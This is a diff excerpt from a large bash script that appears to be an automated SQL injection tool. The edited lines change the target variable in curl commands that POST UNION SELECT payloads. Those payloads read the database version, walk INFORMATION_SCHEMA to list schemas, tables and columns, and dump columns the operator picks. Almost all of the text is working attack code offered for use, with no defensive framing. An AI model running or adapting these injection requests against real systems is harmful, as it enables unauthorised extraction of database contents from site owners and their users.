@@ -11296,7 +11296,7 @@ while true; do
 					Q="$Q""$I"","
 				fi
 				echo "$PAR"" UNION SELECT ""$Q""version() -- -"
-				curl -v -k -X POST -d "$PAR"" UNION SELECT ""$Q""version() -- -" "$TIP"
+				curl -v -k -X POST -d "$PAR"" UNION SELECT ""$Q""version() -- -" "$TURL"
 			done
 			echo "Digit the position of version, if was the first occurence, digit 1, otherwise digit the position number ignoring other numbers"
 			echo "'1,2,8.0.15', the position will be 3 (ignoring the other numbers)"
@@ -11331,9 +11331,9 @@ while true; do
 						for B in $(seq 0 $FST)
 						do
 							echo "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -"
-							curl -v -k -X POST -d "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+							curl -v -k -X POST -d "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TURL"
 							##echo "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -"
-							##curl -v -k -X POST -d "$PAR"" UNINON SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+							##curl -v -k -X POST -d "$PAR"" UNINON SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -" "$TURL"
 						done
 					done
 				else
@@ -11342,9 +11342,9 @@ while true; do
 						for B in $(seq 0 $FST)
 						do
 							echo "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -"
-							curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+							curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TURL"
 							##echo "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -"
-							##curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+							##curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -" "$TURL"
 						done
 					done
 				fi
@@ -11359,7 +11359,7 @@ while true; do
 						read -p "(example, Person, quit for exit): " CLMN
 						if [[ "$CLMN" != "" ]];
 						then
-							curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(""$CLMN"") FROM ""$TBLN"" -- -" "$TIP"
+							curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(""$CLMN"") FROM ""$TBLN"" -- -" "$TURL"
 						fi
 					fi
 				done
